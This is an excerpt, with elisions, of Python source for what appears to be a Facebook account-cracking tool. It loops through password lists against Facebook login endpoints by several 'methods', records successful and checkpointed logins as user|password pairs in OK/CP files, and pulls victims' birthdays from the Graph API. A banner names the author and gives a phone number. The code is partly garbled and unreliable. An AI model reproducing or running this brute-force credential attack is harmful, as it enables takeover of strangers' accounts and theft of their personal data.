...
def hasil(ok,cp):
	if len(ok) != 0 or len(cp) != 0:
		...
		#kazi_samir('\033[1;91mCHECK > %s'%(str(len(cp))));exit()
	else:
...
class __crack__:
	...
	def plerr(self):
		try:
			...
			print (' [*]=============================================')
			self.id = samir(self.apk).read().splitlines()
			kazi_samir(' [*] Total ID : %s'%(len(self.id)))
		...
		if _jokowi_kontol_ in ('M', 'm'):
				...
				if pwek == '':
					...
					def _sempak_(bse=None):
						...
						if boy == '':
							...
							kazi_samir('[•] Result CP saved to CP.txt')
							kazi_samir('\n\tCrack Processing...\n')
							kazi_samir('\n\tCrack Processing...\n\n');logo()
							...
							exit()
					kazi_samir('\n01.) Metode b-api ')
					kazi_samir('02.) Metode mbasic ')
					kazi_samir('03.) Metode Mobile ')
					_sempak_(pwek.split(','))
					break
			...
			kazi_samir('\n\t------[ Method Crack ]-----')
			print (' [*]=============================================')
			kazi_samir(' [1] samir Method 1 ')
			kazi_samir(' [2] samir Method 2  [ Pro ]')
			kazi_samir(' [3] samir Method 3   ')
			print (' [*]=============================================')
			self.__pler__()
		else:
			exit()
	...
	def __api__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write('\r\033[1;97m [samir] %s/%s  \033[1;92mOK-:%s / \033[1;91mCP-:%s'%(loop,len(self.id),len(ok),len(cp))),
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			...
			if "access_token" in p:
				IMTIAZ_samir('\r\033[1;92m[Successful-✓] %s | %s%s      '%(user,pw,tahun(user)))
				...
				try:
					...
					kazi_samir('\r\033[1;91m[Checkpoint] %s | %s • %s %s %s%s      '%(user,pw,day,month,year,tahun(user)))
					...
					pass
				kazi_samir('\r\033[1;91m[Checkpoint] %s | %s%s      '%(user,pw,tahun(user)))
				wrt = '%s - %s%s' % (user,pw,tahun(user))
				cp.append(wrt)
				open('CP.txt','a').write('%s\n' % wrt)
				break
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				...
				try:
					...
					cp_ttl = Prof_IMtiaz('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
					month, day, year = cp_ttl.split('/')
					month = bulan_ttl[month].IMTIAZ_samir('\r\033[1;91m[Checkpoint] %s | %s • %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
					wrt = '%s - %s - %s %s %s%s' % (user,pw,day,month,year,tahun(user))
					cp.append(wrt)
					open('CP.txt','a').write('%s\n' % wrt)
					break
	...
	def __mfb__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				...
				try:
					token = IMTIAZ('token.txt').read()
					cp_ttl = Prof_samir('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
					month, day, year = cp_ttl.split('/')
					month = bulan_ttl[month]
...
##    ## ##     ## ##     ##  ##  ##    ##  
 ...
 [*]=============================================
    Author   : kazi samir
    Facebook : https://facebook.com/FOURKANUDDIN123
    Team     :  Fuck
    Connect  : 01840261060
 [*]=============================================
